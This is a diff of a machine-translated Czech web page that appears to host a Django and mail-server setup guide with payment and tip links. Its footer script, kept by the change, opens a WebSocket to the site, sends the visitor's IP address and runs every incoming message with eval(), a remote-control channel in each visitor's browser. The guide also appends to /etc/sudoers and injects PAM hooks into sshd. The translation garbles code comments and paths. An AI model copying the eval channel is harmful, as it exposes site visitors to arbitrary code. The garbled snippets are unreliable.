@@ -867,7 +867,7 @@ nano users/views.py
             send_verification_email(user)
 # … (Před) přesměrováním (
 </code></pre>Nemusíte přidávat první a poslední řádky v tomto úryvku kódu, jen se ujistěte, že zobrazení registru odešle e -mail ověření uživateli. Mělo by to vypadat takto:<pre class="language-python"><code>
-# … Dovoz
+# … Částky
 from .forms import UserRegisterForm
 
 def register(request):
@@ -932,7 +932,7 @@ def sendwelcomeemail(user):
 Co bude dál? Prošli jsme dlouhou cestu. Opravdu bychom měli být připraveni nasadit web na server. Můžeme přidat dekoratér @Login_Required a zajistit naše názory, přijímat uživatelské registrace, odesílat e -maily a informace o mezipaměti, což je základ toho, co web musí udělat, aby zůstal relevantní. Přidáme několik více užitečných funkcí a poté vytvoříme základ pro nasazení našeho kódu na vzdálený server, nastavení poštovního serveru, konfigurace domény a filtry, aby byl náš web bezpečný a vhodný.
 
 Budeme také potřebovat zobrazení resetování hesla, takže to přidejte opravdu rychle. V některých funkcích je narušen vestavěný zobrazení Django vestavěné resetování hesla, ale podíváme se na to, jak napsat vlastní zobrazení, e -mailovou šablonu, formuláře a vzory URL. Zde je to, jak vypadá pohled, v uživatelích/views.py<pre class="language-python"><code>
-# ... import
+# ... částky
 from django.contrib.auth.tokens import default_token_generator
 from django.contrib.auth.forms import SetPasswordForm
 from django.utils.http import urlsafe_base64_decode
@@ -1820,7 +1820,7 @@ Všimněte si, že se jedná o hodně Jinja, nemusíte mít všechny tyto promě
       &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
       &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
       {% endif %}
-      &lt;small&gt;# {{User.id}} &lt;/mall&gt;
+      &lt;small&gt;# {{user.id}} &lt;/mall&gt;
       &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
     &lt;/div&gt;
     {%if not user.is_superuser %}
@@ -2358,7 +2358,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Injekční konfiguraci PAM a odstraňte vadnou konfiguraci SSH
-# Sudo sed -i '' -and $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # Sudo sed -i '' -and $ d ' /etc /profil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2804,7 +2804,7 @@ nano config/etc_postfix_main.cf
 # Debian Specific: Zadání názvu souboru způsobí první
 # řádek tohoto souboru, který má být použit jako název.  Defian Default
 # IS /ETC /MAILNAME.
-# Myorigine = /etc /poštovní jméno
+# myorigin = /etc /mailName
 
 smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
 biff = no
@@ -2894,7 +2894,7 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrictions
 # -O smtpd_helo_restrictions = $ mua_helo_restrictions
 # -O smtpd_sender_restrictions = $ mua_sender_restrictions
-# -O SMTPD_RECIPIENT_TRASTRICTIONS =
+# -O SMTPD_RECIPIENT_RESTRICTICES =
 # -O smtpd_relay_restrictions = povolení_sasl_authenticated, odmítnout
 # -O milter_macro_daemon_name = původ
 # Vyberte jeden: Povolit SMTPS pouze pro klienty smyčky nebo pro každého klienta.
@@ -2907,7 +2907,7 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrictions
 # -O smtpd_helo_restrictions = $ mua_helo_restrictions
 # -O smtpd_sender_restrictions = $ mua_sender_restrictions
-# -O SMTPD_RECIPIENT_TRASTRICTIONS =
+# -O SMTPD_RECIPIENT_RESTRICTICES =
 # -O smtpd_relay_restrictions = povolení_sasl_authenticated, odmítnout
 # -O milter_macro_daemon_name = původ
 # 628 INET N - Y - - QMQPD
@@ -3105,7 +3105,7 @@ service lmtp {
 service imap {
   # Většina paměti jde do souborů MMAP (). Možná to budete muset zvýšit
   # Omezte, pokud máte obrovské poštovní schránky.
-  # vsz_limit = $ default_vsz_limit
+  # Vsz_limi = $ default_vsz_limit
 
   # Max. Počet procesů IMAP (připojení)
   # Process_limit = 1024
@@ -3161,7 +3161,7 @@ service dict {
 </code></pre>Ještě jednou nezapomeňte vyměnit doménu ve všech těchto souborech, FemmeBabe.com, s vybranou doménou. Upravte další soubor, konfiguraci Dovecot,<pre class="language-bash"><code>
 nano config/etc_dovecot_dovecot
 </code></pre>A přidejte tyto řádky<pre class="language-bash"><code>
-## Konfigurační soubor Dovecot
+## Konfigurační soubor OVECOT
 
 # Pokud spěcháte, podívejte se na http://wiki2.dovecot.org/quickconfiguration
 
@@ -3221,7 +3221,7 @@ nano config/etc_dovecot_dovecot
 # Zobrazit více podrostných procesů procesu (v PS). V současné době ukazuje uživatelské jméno a
 # IP adresa. Užitečné vidět, kdo skutečně používá procesy IMAP
 # (např. Sdílené poštovní schránky nebo pokud se pro více účtů používá stejné UID).
-# verbose_proctle = ne
+# Verbose_procitle = ne
 
 # Pokud by se zabily všechny procesy, když se uzavírá hlavní proces Dovecot.
 # Nastavení na „ne“ znamená, že Dovecot lze upgradovat bez
@@ -3251,7 +3251,7 @@ nano config/etc_dovecot_dovecot
 # "Proxy :: &lt;name&gt;".
 
 dict {
-  # Kvóta = mysql: /andc/dovecot/dovecot-dic-sql.conf.ext
+  # Kvóta = mysql: /etc/dovecot/dovecot-dict-sql.conf.ext
 }
 
 # Většina skutečné konfigurace je zahrnuta níže. Názvy souborů jsou
@@ -3358,7 +3358,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # Změna na/var/cívky/postfix/run/opendkim k použití zásuvky Unix s
 # postfix v chrootu:
-# Rundir =/WAS/SPOOL/POSTFIX/RUN/OpenDKIM
+# Rundir =/var/cívka/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Nekonečné zařazení alternativní zásuvky
@@ -3547,7 +3547,7 @@ Děkujeme, že jste si udělali čas na přečtení tohoto příručky pro vývo
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Nakoupit</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Nakupujte pomocí kryptoměny</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Nakoupit</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Nakupujte pomocí kryptoměny</a></p>
 
 
 <hr>
@@ -3587,7 +3587,7 @@ Děkujeme, že jste si udělali čas na přečtení tohoto příručky pro vývo
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3624,12 +3624,16 @@ Děkujeme, že jste si udělali čas na přečtení tohoto příručky pro vývo
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Zanechte mi tip v bitcoinech pomocí této adresy:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Zkopírujte adresu" onclick="copyToClipboard('btc-wallet');">Kopie</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Navštivte mě na Instagramu" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Navštivte mě na Twitteru" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Sledujte mě na YouTube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=cs" title="Podívejte se na podmínky služby">Podmínky služby</a></span></p>
 		    </div>
@@ -3672,32 +3676,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3844,34 +3848,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Sdílejte tuto stránku skenováním QR kódu.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
